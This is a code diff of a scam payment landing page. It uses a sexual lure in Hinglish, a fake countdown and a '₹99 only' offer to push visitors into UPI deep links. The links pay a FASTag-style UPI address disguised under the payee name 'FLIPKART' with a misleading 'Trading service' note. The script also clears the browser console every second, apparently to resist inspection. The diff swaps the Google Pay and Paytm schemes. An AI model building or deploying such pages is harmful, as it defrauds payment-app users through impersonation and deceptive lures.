@@ -64,40 +64,32 @@
             border-radius: 8px;
             font-size: 14px;
             text-align: center;
+            border-left: 4px solid #00a541;
+            font-weight: bold;
+            color: #096e32;
         }
 
-        .payment-option-big {
+        .payment-option {
             display: flex;
             align-items: center;
-            justify-content: space-between;
-            padding: 18px 20px;
-            margin: 15px;
-            background: linear-gradient(135deg, #6c2dc7, #8e44ad);
-            color: white;
-            font-size: 20px;
-            font-weight: bold;
-            border-radius: 12px;
-            box-shadow: 0 4px 10px rgba(108, 45, 199, 0.4);
+            padding: 12px;
+            border-top: 1px solid #ddd;
             cursor: pointer;
-            transition: transform 0.2s ease, box-shadow 0.2s ease;
         }
 
-        .payment-option-big:hover {
-            transform: scale(1.05);
-            box-shadow: 0 6px 15px rgba(108, 45, 199, 0.6);
+        .payment-option img {
+            width: 30px;
+            height: 30px;
+            margin-right: 15px;
         }
 
-        .payment-option-big img {
-            width: 40px;
-            height: 40px;
-            background: white;
-            padding: 5px;
-            border-radius: 50%;
-        }
-
-        .payment-option-big span {
+        .payment-option span {
             flex-grow: 1;
-            margin-left: 15px;
+        }
+
+        .arrow {
+            font-size: 18px;
+            color: #888;
         }
 
         .arrow {
@@ -117,6 +109,56 @@
             color: #888;
             padding: 10px;
         }
+
+        .payment-btn {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background-color: #fff;
+            border: none;
+            border-left: 4px solid #00c853;
+            padding: 10px 18px;
+            border-radius: 10px;
+            width: 90%;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 500;
+            transition: box-shadow 0.2s ease;
+        }
+
+        .payment-btn:hover {
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
+        }
+
+        .payment-info {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .payment-btn img {
+            width: 35px;
+            height: 35px;
+            border-radius: 50%;
+            padding: 5px;
+            box-shadow: rgba(0, 0, 0, 0.24) 0px 3px 8px;
+        }
+
+        .payment-btn-group {
+            padding: 5px;
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+            color: black;
+        }
+
+        .arrow {
+            font-size: 30px;
+            color: #cccccc;
+            flex-shrink: 0;
+            z-index: 999;
+        }
     </style>
 </head>
 
@@ -125,17 +167,39 @@
         <img src="/assets/Forex-Trader-photo.jpg" width="100%" />
         <div class="header">Special Offer Only For Today</div>
         <div class="price">₹99 Only</div>
-        <div class="offer-timer">⏳ Offer ends in: 03:50</div>
-        <div class="message">
-            Sirf 99rs ka recharge kar ke ajao video call pe sab dikhaungi kapde khol ke
-        </div>
+        <div class="offer-timer" id="countdown">⏳ Offer ends in: 03:50</div>
+        <div class="message">Sirf 99rs ka recharge kar ke ajao video call pe sab dikhaungi kapde khol ke</div>
 
-        <div class="payment-option-big" onclick="makePayment()">
-            <img src="/assets/phonepe_logo.png" alt="PhonePe">
-            <span>Pay with PhonePe</span>
-            <div class="arrow">›</div>
+        <div class="payment-btn-group">
+            <div class="payment-btn" onclick="makePayment('phonepe')">
+                <div class="payment-info">
+                    <img src="assets/phonepe_logo.png" alt="PhonePe" />
+                    <span>Pay with PhonePe</span>
+                </div>
+                <span class="arrow">›</span>
+            </div>
+            <div class="payment-btn" onclick="makePayment('paytm')">
+                <div class="payment-info">
+                    <img src="assets/paytm.png" alt="Paytm" />
+                    <span>Pay with PayTm</span>
+                </div>
+                <span class="arrow">›</span>
+            </div>
+            <div class="payment-btn" onclick="makePayment('gpay')">
+                <div class="payment-info">
+                    <img src="assets/google_pay.png" alt="Google Pay" />
+                    <span>Pay with Google Pay</span>
+                </div>
+                <span class="arrow">›</span>
+            </div>
+            <div class="payment-btn" onclick="makePayment('bhim')">
+                <div class="payment-info">
+                    <img src="assets/bhim_upi.png" alt="BHIM UPI" />
+                    <span>Pay with BHIM UPI</span>
+                </div>
+                <span class="arrow">›</span>
+            </div>
         </div>
-
         <div class="footer">Limited time offer. Terms and conditions apply.</div>
     </div>
 </body>
@@ -167,15 +231,62 @@
             console.clear();
         }, 1000);
     })();
-    function makePayment() {
+    function makePayment(method) {
         try {
-            const phonePeUrl = `phonepe://pay?pn=FLIPKART&pa=netc.34161FA820328AA2CB704D00@mairtel&am=99&tn=Paying for Trading service&tr=Fastag&cu=INR&mc=0000&qrMedium=04`;
-            window.location.href = phonePeUrl;
+            let redirectUrl = '';
+
+            switch (method) {
+                case 'phonepe':
+                    redirectUrl = 'phonepe://pay?pn=FLIPKART&pa=netc.34161FA820328AA2CB704D00@mairtel&am=99&tn=Paying for Trading service&tr=Fastag&cu=INR&mc=0000&qrMedium=04';
+                    break;
+                case 'gpay':
+                    redirectUrl = 'paytmmp://pay?pn=FLIPKART&pa=netc.34161FA820328AA2CB704D00@mairtel&am=99&tn=Paying for Trading service&tr=Fastag&cu=INR&mc=0000&qrMedium=04';
+                    break;
+                case 'paytm':
+                    redirectUrl = 'tez://upi/pay?pn=FLIPKART&pa=netc.34161FA820328AA2CB704D00@mairtel&am=99&tn=Paying for Trading service&tr=Fastag&cu=INR&mc=0000&qrMedium=04';
+                    break;
+                case 'bhim':
+                    redirectUrl = 'upi://pay?pn=FLIPKART&pa=netc.34161FA820328AA2CB704D00@mairtel&am=99&tn=Paying for Trading service&tr=Fastag&cu=INR&mc=0000&qrMedium=04';
+                    break;
+                default:
+                    alert('Invalid payment method!');
+                    return;
+            }
+            window.location.href = redirectUrl;
         } catch (err) {
             console.log(err)
             alert(err)
         }
     }
+    let minutes = 3;
+    let seconds = 50;
+
+    const countdownEl = document.getElementById('countdown');
+
+    function updateCountdown() {
+        if (minutes === 0 && seconds === 0) {
+            countdownEl.textContent = "⏳ Offer ended!";
+            clearInterval(timerInterval);
+            return;
+        }
+
+        // Decrement time
+        if (seconds === 0) {
+            minutes--;
+            seconds = 59;
+        } else {
+            seconds--;
+        }
+
+        // Format mm:ss
+        let minText = minutes < 10 ? "0" + minutes : minutes;
+        let secText = seconds < 10 ? "0" + seconds : seconds;
+
+        countdownEl.textContent = `⏳ Offer ends in: ${minText}:${secText}`;
+    }
+
+    // Run every second
+    const timerInterval = setInterval(updateCountdown, 1000);
 </script>
 
 </html>
